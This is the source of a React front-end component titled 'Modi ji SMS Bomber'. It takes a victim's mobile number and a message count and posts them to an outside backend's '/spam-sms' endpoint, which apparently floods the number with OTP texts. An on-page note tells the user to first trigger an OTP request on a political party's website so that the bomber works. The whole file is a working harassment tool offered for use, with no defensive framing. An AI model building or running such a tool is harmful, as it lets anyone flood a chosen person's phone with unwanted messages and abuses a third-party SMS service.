"use client"

import { useState } from "react";
import { CardTitle, CardDescription, CardHeader, CardContent, Card } from "@/components/ui/card";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Loader } from "lucide-react";
import axios from "axios";

export default function Component() {
  const [loading, setLoading] = useState(false);
  const [mobile, setMobile] = useState('');
  const [smsCount, setSmsCount] = useState('');
  const [response, setResponse] = useState(false); // [1
  const [responseMessage, setResponseMessage] = useState({
    successCount: 0,
    failureCount: 0
  }); // 1

  const handleSubmit = (e: any) => {
    e.preventDefault();
    setLoading(true);
    console.log('Mobile:', mobile);
    console.log('SMS Count:', smsCount);

    axios.post('https://modijiop.onrender.com/spam-sms', {
      mobile: mobile,
      smsCount: smsCount
    })
      .then(response => {
        console.log('Response:', response.data);
        setResponse(true) // 1
        setResponseMessage(response.data);
        setLoading(false);
      })
      .catch(error => {
        console.error('Error:', error);
        // Handle error here
      });
  };

  return (
      <div className="flex flex-col items-center justify-center h-screen bg-gray-100 dark:bg-gray-900">
        <Card className="w-full max-w-md p-6 space-y-4">
        <div className="">
        you need to once request otp on <a href="https://phirekbaarmodisarkar.bjp.org/en/#live_b" className="underline text-blue-400">This site</a> jsut request opt no need to enter it once you do it then use this bomber it will work. Yeah I can automate this but I an lazy to do so 😂
        </div>
          <CardHeader>
            <CardTitle>Modi ji SMS Bomber</CardTitle>
            <CardDescription>Enter the mobile number and number of messages to send.</CardDescription>
          </CardHeader>
          <CardContent>
            <form className="space-y-4" onSubmit={handleSubmit}>
              <div className="space-y-2">
                <Label htmlFor="mobile">Mobile Number</Label>
                <Input className="w-full" id="mobile" pattern="[0-9]*" placeholder="Enter mobile number" type="tel" value={mobile} onChange={(e) => setMobile(e.target.value)} />
              </div>
              <div className="space-y-2">
                <Label htmlFor="messages">Number of Messages</Label>
                <Input className="w-full" id="messages" min="1" placeholder="Enter number of messages" type="number" value={smsCount} onChange={(e) => setSmsCount(e.target.value)} />
              </div>
              <Button className="w-full relative" type="submit" disabled={loading}>
                <span className="flex items-center justify-center">
                  {loading ? (
                    <Loader className="animate-spin w-5 h-5 mr-2" />
                  ) : (
                    "Bomb 💣"
                  )}
                </span>
              </Button>
            </form>
          </CardContent>
          {response ? (`Success Count: ${responseMessage.successCount}
      failure count ${responseMessage.failureCount}`) : (<></>)}
      </Card>
    </div >
  );
}
